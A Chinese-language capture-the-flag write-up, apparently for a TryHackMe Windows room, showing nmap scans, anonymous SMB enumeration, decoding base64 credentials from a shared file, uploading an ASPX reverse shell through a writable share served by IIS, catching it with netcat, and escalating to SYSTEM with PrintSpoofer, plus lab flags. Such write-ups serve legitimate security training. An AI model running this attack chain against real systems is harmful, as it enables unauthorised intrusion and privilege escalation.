# 服务发现
```                                                                                                  130 ⨯
┌──(root💀kali)-[~]
└─#  nmap -sV -Pn 10.10.150.167 -p-                                                                                                                                                                                                    255 ⨯
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-09 04:20 EDT
Nmap scan report for 10.10.150.167
Host is up (0.32s latency).
Not shown: 65527 filtered ports
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
49663/tcp open  http          Microsoft IIS httpd 10.0
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 448.90 seconds

```
# 分析
80和49663都开启了http服务，目录爆破没有发现什么有趣的东西
445貌似存在永恒之蓝漏洞，但是没有攻击成功

# samba 枚举,提示在\\10.10.150.167\nt4wrksv 里有一个passwords.txt文件
```
┌──(root💀kali)-[~/tryhackme]
└─#  nmap --script "safe or smb-enum-*" -p 445 10.10.207.135 > smb.txt

smb-enum-shares: 
|   account_used: guest
|   \\10.10.150.167\ADMIN$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Remote Admin
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.150.167\C$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Default share
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.150.167\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: Remote IPC
|     Anonymous access: <none>
|     Current user access: READ/WRITE
|   \\10.10.150.167\nt4wrksv: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Anonymous access: <none>
|_    Current user access: READ/WRITE
| smb-ls: Volume \\10.10.150.167\nt4wrksv
| SIZE   TIME                 FILENAME
| <DIR>  2020-07-25T15:10:05  .
| <DIR>  2020-07-25T15:10:05  ..
| 98     2020-07-25T15:13:05  passwords.txt
|_

```

# 匿名连接//10.10.150.167/nt4wrksv ,下载passwords.txt文件
```
──(root💀kali)-[~]
└─#  smbclient  //10.10.150.167/nt4wrksv                                                                                                                                                                                                 1 ⨯
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Sep  8 06:09:40 2021
  ..                                  D        0  Wed Sep  8 06:09:40 2021
  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020

                7735807 blocks of size 4096. 5137057 blocks available

smb: \> get passwords.txt
getting file \passwords.txt of size 98 as passwords.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \> ^C

```

# 本地打开passwords.txt文件，是一个加密的用户账号密码
```
┌──(root💀kali)-[~]
└─#  cat passwords.txt 
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk 
```

# 看末尾有两个==号，猜测是base64加密，放到hackbar里解密
```
加密串：Qm9iIC0gIVBAJCRXMHJEITEyMw==  

解密：Bob - !P@$$W0rD!123

加密串：QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk 
解密：Bill - Juw4nnaM4n420696969!$$$
```

# 所以这两个是什么服务的账号密码？
因为开了3389端口，以为是远程连接的账号，尝试连接，但是都失败了

# 然而打开http://10.10.150.167:49663/nt4wrksv/passwords.txt，同样可以访问到上面的信息，说明分享的目录在iss可以访问的目录内，也就是说可以通过上传一个asp文件
，拿到反弹的shell


# 成功上传一个asp文件,payload见：https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx
```
┌──(root💀kali)-[~]
└─#  smbclient  //10.10.150.167/nt4wrksv 
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.       
smb: \> put /root/tryhackme/rev
reverse_shell.apsx  revse_shell.php       
smb: \> put /root/tryhackme/reverse_shell.apsx ./shell.aspx
putting file /root/tryhackme/reverse_shell.apsx as \shell.aspx (11.7 kb/s) (average 11.7 kb/s)
smb: \> ls
  .                                   D        0  Thu Sep  9 04:33:54 2021
  ..                                  D        0  Thu Sep  9 04:33:54 2021
  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020
  shell.aspx                          A    15492  Thu Sep  9 04:33:55 2021

                7735807 blocks of size 4096. 5134626 blocks available
smb: \> 
```

# 访问http://10.10.150.167:49663/nt4wrksv/shell.aspx，拿到一个反弹shell
```
┌──(root💀kali)-[~/tryhackme]
└─#  nc -lnvp 1234                                                                                                                                                                                                                     130 ⨯
listening on [any] 1234 ...
connect to [10.13.21.169] from (UNKNOWN) [10.10.150.167] 49893
Spawn Shell...
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\defaultapppool

c:\windows\system32\inetsrv>

```

# 拿到userflag
```
c:\Users\Bob\Desktop>type user.txt
type user.txt
THM{fdk4ka34vk346ksxfr21tg789ktf45}
```

# 运行whoami /priv查看当前用户在系统中的权限
```
PS C:\inetpub\wwwroot\nt4wrksv> whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

```

# 当前用户启用了SeImpersonatePrivilege，意味着可以利用令牌模拟来提升权限
从https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0下载64位的PrintSpoofer64.exe，然后通过smb上传到windows靶机

# 提权
PS C:\inetpub\wwwroot\nt4wrksv> .\PrintSpoofer64.exe -i -c cmd
.\PrintSpoofer64.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system


# 拿到root flag
```
PS C:\users\administrator\desktop> type root.txt
type root.txt
THM{1fk5kf469devly1gl320zafgl345pv}
PS C:\users\administrator\desktop> 
```